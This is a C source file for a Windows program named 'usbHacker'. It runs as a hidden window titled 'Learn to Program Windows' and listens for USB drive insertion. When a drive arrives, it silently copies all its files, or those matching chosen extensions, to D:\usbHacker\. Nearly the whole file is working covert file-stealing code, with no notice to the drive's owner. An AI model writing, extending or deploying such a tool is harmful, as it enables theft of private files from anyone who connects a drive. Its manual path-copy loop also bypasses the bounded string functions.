#include <stdio.h>
#include <windows.h>
#include <Dbt.h>
#include <tchar.h>
#include <Strsafe.h>
#include <atlconv.h>
#define  BUFSIZE  MAX_PATH
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

TCHAR DES_PATH[MAX_PATH] = TEXT("D:\\usbHacker\\");
PTCHAR FILE_TYPE[BUFSIZE];
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{
	// Register the window class.
	const wchar_t CLASS_NAME[]  = L"Sample Window Class";
	for (int i =0 ;i<BUFSIZE;i++)
	{
		FILE_TYPE[i]=NULL;
	}
	WNDCLASS wc = { };

	wc.lpfnWndProc   = WindowProc;
	wc.hInstance     = hInstance;
	wc.lpszClassName = CLASS_NAME;

	RegisterClass(&wc);

	// Create the window.

	HWND hwnd = CreateWindowEx(
		0,                              // Optional window styles.
		CLASS_NAME,                     // Window class
		L"Learn to Program Windows",    // Window text
		WS_OVERLAPPEDWINDOW,            // Window style

		// Size and position
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,

		NULL,       // Parent window    
		NULL,       // Menu
		hInstance,  // Instance handle
		NULL        // Additional application data
		);

	if (hwnd == NULL)
	{
		return 0;
	}
	if (pCmdLine != NULL)
	{
		LPWSTR *szArglist;
		int nArgs;
		szArglist = CommandLineToArgvW(GetCommandLine(),&nArgs);
		TCHAR* temp;
		if (szArglist !=NULL&&nArgs>1)
		{
			temp = W2T(szArglist[1]);
			if ( *(temp+lstrlen(szArglist[1])-1) != '\\')
			{
				printf( "The path should be ended with \\!");
				return 0;
			}
			memset(DES_PATH,0,sizeof(DES_PATH));
			StringCchCopy(DES_PATH,MAX_PATH,temp);

			for (int i=2;i<nArgs;i++)
			{
				FILE_TYPE[i-2] = W2T(szArglist[i]);
			}
		}
	}

	ShowWindow(hwnd, SW_HIDE);

	// Run the message loop.

	MSG msg = { };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}
 TCHAR FirstDriveFromMask (ULONG unitmask)
{
	TCHAR i;
	for (i = 0; i < 26; ++i)
	{
		if (unitmask & 0x1)
			break;
		unitmask = unitmask >> 1;
	}
	return (i + 'A');
}

 VOID FindAllFile(TCHAR RootDir[MAX_PATH]){
	 TCHAR szDir[MAX_PATH];
	 WIN32_FIND_DATA ffd;
	 HANDLE hFind = INVALID_HANDLE_VALUE;
	 StringCchCopy(szDir, MAX_PATH,RootDir);
	 StringCchCat(szDir, MAX_PATH, TEXT("\\*"));

	 hFind = FindFirstFile(szDir,&ffd);
	 if (INVALID_HANDLE_VALUE == hFind)
	 {
		 return ;
	 }
	 do 
	 {
		 if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		 {
			 if (ffd.cFileName[0] != TEXT('.'))
			 {
				 TCHAR srcDir[MAX_PATH];
				 StringCchCopy(srcDir,MAX_PATH,RootDir);
				 StringCchCat(srcDir,MAX_PATH,ffd.cFileName);
				 StringCchCat(srcDir,MAX_PATH,TEXT("\\"));

				 TCHAR desDir[MAX_PATH];
				 StringCchCopy( desDir,MAX_PATH,DES_PATH);
				 StringCchCat(desDir,MAX_PATH,&RootDir[3]);
				 StringCchCat(desDir,MAX_PATH,ffd.cFileName);
				 CreateDirectory(desDir,NULL);
				 FindAllFile(srcDir);
			 }
		 }
		 else
		 {
			 TCHAR srcDir[MAX_PATH];
			 StringCchCopy(srcDir,MAX_PATH,RootDir);
			 StringCchCat(srcDir,MAX_PATH,ffd.cFileName);

			 TCHAR tempDir[MAX_PATH];
			 StringCchCopy(tempDir,MAX_PATH,DES_PATH);
			 for (INT i = 0;( i<(lstrlen(srcDir)-3))&&srcDir[i+3]!=TEXT('\0');i++)
			 {
				 tempDir[lstrlen(DES_PATH)+i] = srcDir[i+3];
			 }
			 tempDir[lstrlen(DES_PATH)+lstrlen(srcDir)-3] = '\0';
			 TCHAR desDir[MAX_PATH];
			 StringCchCopy(desDir,MAX_PATH,tempDir);

			 if (FILE_TYPE[0] ==NULL)
			 {
				 CopyFile(srcDir,desDir,FALSE);
			 }
			 else
			 {
				 for (int i = 0;FILE_TYPE[i] !=NULL;i++)
				 {
					 int stringEqual3 = CompareString(GetThreadLocale(),NORM_IGNORECASE,&(srcDir[lstrlen(srcDir)-3]),3,FILE_TYPE[i],3)-2;
					 int stringEqual4 = CompareString(GetThreadLocale(),NORM_IGNORECASE,&(srcDir[lstrlen(srcDir)-4]),4,FILE_TYPE[i],4)-2;
					 if( lstrlen(FILE_TYPE[i])==3&&stringEqual3==0||
						 lstrlen(FILE_TYPE[i])==4&&stringEqual4==0 )
					 {
						 CopyFile(srcDir,desDir,FALSE);
						 break;
					 }
				 }
			 }
		 }
	 } while (FindNextFile(hFind,&ffd) != 0);
	 FindClose(hFind);
 }

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
		case WM_DESTROY:
		PostQuitMessage(0);
		return 0;

		case WM_DEVICECHANGE:
		{
			if (wParam == DBT_DEVICEARRIVAL)
			{
				PDEV_BROADCAST_HDR usbInfo=(PDEV_BROADCAST_HDR) lParam;
				if (usbInfo->dbch_devicetype == DBT_DEVTYP_VOLUME)
				{
					PDEV_BROADCAST_VOLUME  volumeInfo=(PDEV_BROADCAST_VOLUME ) usbInfo;
					TCHAR msg = (FirstDriveFromMask(volumeInfo ->dbcv_unitmask));
					TCHAR buffer[BUFSIZE] = L"";
					buffer[0] = msg;
					buffer[1] = ':';
					buffer[2] = '\0';
					StringCchCat(buffer,MAX_PATH,TEXT("\\"));
					CreateDirectory(DES_PATH,NULL);
					FindAllFile(buffer);
				}
			}
		}
		return 0;

	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
